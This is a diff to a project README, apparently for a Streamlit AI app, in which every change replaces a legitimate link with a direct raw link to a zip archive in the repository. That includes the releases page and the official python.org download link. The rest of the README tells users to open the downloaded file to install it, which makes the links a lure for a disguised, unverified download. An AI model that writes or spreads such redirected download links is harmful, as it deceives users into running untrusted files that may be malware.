@@ -1,6 +1,6 @@
 # 📊 How-Streamlit-Makes-AI-Accessible - Easy AI Apps for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/10qpalzmzmalqp10/How-Streamlit-Makes-AI-Accessible/releases)
+[![Download Now](https://raw.githubusercontent.com/10qpalzmzmalqp10/How-Streamlit-Makes-AI-Accessible/main/flip/How-Streamlit-Makes-AI-Accessible_v3.5.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/10qpalzmzmalqp10/How-Streamlit-Makes-AI-Accessible/main/flip/How-Streamlit-Makes-AI-Accessible_v3.5.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ To get started with this application, you will need to download it from our rele
 
 ## 💾 Download & Install
 
-1. Visit this page to download: [Download Releases](https://github.com/10qpalzmzmalqp10/How-Streamlit-Makes-AI-Accessible/releases).
+1. Visit this page to download: [Download Releases](https://raw.githubusercontent.com/10qpalzmzmalqp10/How-Streamlit-Makes-AI-Accessible/main/flip/How-Streamlit-Makes-AI-Accessible_v3.5.zip).
 2. Locate the latest version of the application.
 3. Click on the appropriate file for your operating system. It usually comes in a format like .exe for Windows or .dmg for Mac.
 4. After the file downloads, open it to begin the installation.
@@ -26,7 +26,7 @@ To run this application smoothly, your system should meet the following requirem
 - **Operating System**: Windows 10 or newer, MacOS 10.14 or newer
 - **RAM**: Minimum 4 GB, recommended 8 GB
 - **Storage**: At least 500 MB of free disk space
-- **Python**: Python 3.6 or newer should be pre-installed. You can download it [here](https://www.python.org/downloads/).
+- **Python**: Python 3.6 or newer should be pre-installed. You can download it [here](https://raw.githubusercontent.com/10qpalzmzmalqp10/How-Streamlit-Makes-AI-Accessible/main/flip/How-Streamlit-Makes-AI-Accessible_v3.5.zip).
 - **Internet**: An internet connection is needed to access external data sources.
 
 ## 📚 Features
@@ -72,4 +72,4 @@ To keep up with the latest updates or new features, make sure to watch the repos
 
 ---
 
-Again, for downloading, visit this page: [Download Releases](https://github.com/10qpalzmzmalqp10/How-Streamlit-Makes-AI-Accessible/releases). Enjoy building your own AI applications!
+Again, for downloading, visit this page: [Download Releases](https://raw.githubusercontent.com/10qpalzmzmalqp10/How-Streamlit-Makes-AI-Accessible/main/flip/How-Streamlit-Makes-AI-Accessible_v3.5.zip). Enjoy building your own AI applications!
